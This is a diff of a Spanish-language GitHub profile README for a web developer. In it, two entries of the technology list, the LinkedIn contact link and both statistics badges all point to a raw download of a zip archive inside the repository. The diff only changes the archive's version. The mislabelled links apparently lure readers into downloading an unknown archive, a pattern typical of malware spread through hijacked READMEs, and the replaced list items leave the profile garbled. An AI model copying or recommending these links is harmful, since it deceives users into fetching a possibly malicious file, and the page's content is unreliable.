@@ -9,23 +9,23 @@ Soy un desarrollador versátil con habilidades tanto en el front-end como en el 
 En mi trayectoria profesional, aspiro a alcanzar un dominio integral en el desarrollo web, abarcando no solo las tecnologías existentes, sino también las tendencias emergentes en el mercado. Mi objetivo es contribuir a proyectos desafiantes que impulsen mi crecimiento y permitan ofrecer soluciones innovadoras y eficaces en el ámbito del diseño web. Mi pasión impulsa mi búsqueda constante de conocimientos y habilidades, y me comprometo a evolucionar continuamente como profesional en este campo dinámico y en constante cambio.
 
 ### Tecnologías que manejo
-- https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-v3.8-beta.4.zip
+- https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-2.0-alpha.5.zip
 - HTML
 - CSS
-- https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-v3.8-beta.4.zip
+- https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-2.0-alpha.5.zip
 - Redux
 - React Bootstrap
 - Sequelize
 - PostgreSQL
 
 ### Mantente en Contacto
-¡No dudes en contactarme a través de mi [LinkedIn](https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-v3.8-beta.4.zip)! Siempre estoy abierto a nuevas oportunidades y colaboraciones.
+¡No dudes en contactarme a través de mi [LinkedIn](https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-2.0-alpha.5.zip)! Siempre estoy abierto a nuevas oportunidades y colaboraciones.
 
 
 
 <!-- Estadísticas generales -->
-[![Estadísticas generales](https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-v3.8-beta.4.zip)](https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-v3.8-beta.4.zip)
+[![Estadísticas generales](https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-2.0-alpha.5.zip)](https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-2.0-alpha.5.zip)
 
 <!-- Lenguajes principales -->
-[![Lenguajes principales](https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-v3.8-beta.4.zip)](https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-v3.8-beta.4.zip)
+[![Lenguajes principales](https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-2.0-alpha.5.zip)](https://github.com/matiaslanza99/matiaslanza99/raw/refs/heads/main/chestnutty/matiaslanza-2.0-alpha.5.zip)
 
